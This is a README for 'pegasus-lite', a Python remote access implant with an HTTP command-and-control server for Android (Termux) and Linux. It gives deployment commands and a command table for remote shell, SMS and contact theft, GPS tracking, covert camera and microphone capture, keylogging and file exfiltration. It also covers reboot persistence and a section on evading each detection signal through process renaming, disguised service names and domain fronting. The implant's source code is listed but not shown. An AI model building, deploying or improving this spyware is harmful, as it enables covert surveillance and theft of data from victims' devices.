```markdown
# pegasus-lite

Linux + Termux remote access implant with HTTP C2. Single-repo, Python-only, GitHub-deployable.

**Not NSO Pegasus.** Same architectural shape: C2 server, polling implant, task queue, file exfil, persistence. No zero-click exploit, no kernel chain, no commercial backing. Everything below is open and rebuildable.

---

## Contents

1. [Architecture](#architecture)
2. [Repo layout](#repo-layout)
3. [Install](#install)
4. [Run — server](#run--server)
5. [Run — client (Termux)](#run--client-termux)
6. [Run — client (Linux)](#run--client-linux)
7. [Command reference](#command-reference)
8. [Detection surface](#detection-surface)
9. [Source — requirements.txt](#source--requirementstxt)
10. [Source — server/server.py](#source--serverserverpy)
11. [Source — client/client.py](#source--clientclientpy)
12. [Source — install.sh](#source--installsh)
13. [Source — start.sh](#source--startsh)
14. [Hardening notes](#hardening-notes)

---

## Architecture

```

+----------------+        HTTP(S)         +---------------------+

|  implant       | <------------------->  |  C2 server          |

|  (Termux/Linux)|   register / poll /    |  Flask + SQLite     |

|                |   result upload        |  dashboard :8080    |
+----------------+                        +---------------------+

shell / sms / camera /                   server/uploads/
mic / location / keylog /                server/c2.db
screenshot / clipboard

```

- **Server** — Flask HTTP C2. SQLite holds targets, tasks, results. Dashboard dispatches commands and renders output. Files land in `server/uploads/`.
- **Client** — auto-detects Termux vs Linux. Registers once, stores `target_id`, then polls for tasks, executes, uploads result. Persists across reboot via systemd (Linux) or Termux:Boot.
- **Transport** — HTTP by default. Wrap in TLS via reverse proxy for real use.

---

## Repo layout

```

pegasus-lite/
├── README.md
├── requirements.txt
├── server/
│   └── server.py
├── client/
│   └── client.py
├── install.sh
└── start.sh

```

Create the two directories (`server/`, `client/`) and drop the files in.

---

## Install

### Server (any Linux box / VPS)
```bash
git clone <your-repo> pegasus-lite && cd pegasus-lite
pip install -r requirements.txt
python server/server.py --host 0.0.0.0 --port 8080
# dashboard: http://your-host:8080
```

Client — Termux

```bash
pkg update -y && pkg upgrade -y
pkg install -y python termux-api git
termux-setup-storage
pip install requests
C2_URL=http://your-server:8080 python client/client.py
```

Client — Linux

```bash
pip install requests
C2_URL=http://your-server:8080 python client/client.py
```

Or one-shot: bash install.sh then bash start.sh client.

---

Run — server

```bash
python server/server.py --host 0.0.0.0 --port 8080
```

Flags:

· --host default 0.0.0.0
· --port default 8080

Dashboard at /. JSON API:

· GET /api/targets — registered implants
· GET /api/results — recent task output
· POST /api/task — {target_id, cmd, args} — dispatch
· POST /register — implant check-in
· GET /task/<target_id> — implant polls
· POST /result — implant reports

---

Run — client (Termux)

```bash
C2_URL=http://your-server:8080 python client/client.py
```

Persist:

```bash
C2_URL=http://your-server:8080 bash start.sh client
# then from dashboard: cmd=persist
```

persist writes ~/.termux/boot/start-pl.sh. Requires the Termux:Boot app installed and opened once. Termux:Boot runs scripts in ~/.termux/boot/ at device boot.

---

Run — client (Linux)

```bash
C2_URL=http://your-server:8080 python client/client.py
```

persist installs a systemd user unit ~/.config/systemd/user/pl.service (systemctl --user enable --now pl.service) plus a cron @reboot fallback.

---

Command reference

cmd args action
sysinfo — hostname, os, user, arch, cwd, pid
shell {"raw":"id"} or {"cmd":"id"} run shell command, return stdout+stderr
ls {"path":"/sdcard"} directory listing
download {"path":"/sdcard/x.jpg"} exfil file to server
upload — not supported client→server; use download
sms {"limit":50} Termux only — SMS inbox
contacts — Termux only — contact list
location — Termux only — one-shot GPS fix
camera {"camera":0} Termux only — photo, exfil
mic {"seconds":10} Termux only — audio record, exfil
clipboard — Termux / xclip / wl-paste
screenshot — scrot / import / grim
keylog_start {"out":"/path/log"} Linux only — pynput listener
keylog_stop — stop and exfil log
persist — systemd (Linux) or Termux:Boot
sleep {"seconds":60} pause beacon for N seconds

---

Detection surface

Network

· Plain HTTP → deep-packet inspection, proxy logs, SNI/reputation.
· Constant 5s poll → periodic beacon signature. Add jitter in production.
· Single C2 domain in DNS logs per target.

Host — Termux

· /proc/<pid>/cmdline shows python client/client.py.
· ~/.cache/.pl_state and ~/.cache/.pl_keys.log on disk.
· ~/.termux/boot/start-pl.sh present.
· termux-api bridge calls visible to Android's am audit if logging enabled.

Host — Linux

· systemctl --user list-units | grep pl shows pl.service.
· crontab -l shows pl_keepalive.
· Outbound HTTPS to C2 from python process.
· pynput listener requires X/Wayland session.

What defeats each

· Beacon jitter, TLS via reverse proxy with real cert, domain fronting.
· Rename process (exec -a / argv rewrite), memory-only state (no .pl_state file), systemd unit named after a system service.
· Strip cron, use only systemd; or systemd only on non-root user, hidden in a plausible unit name.

---

Source — requirements.txt

```
flask>=3.0
requests>=2.31
```

---
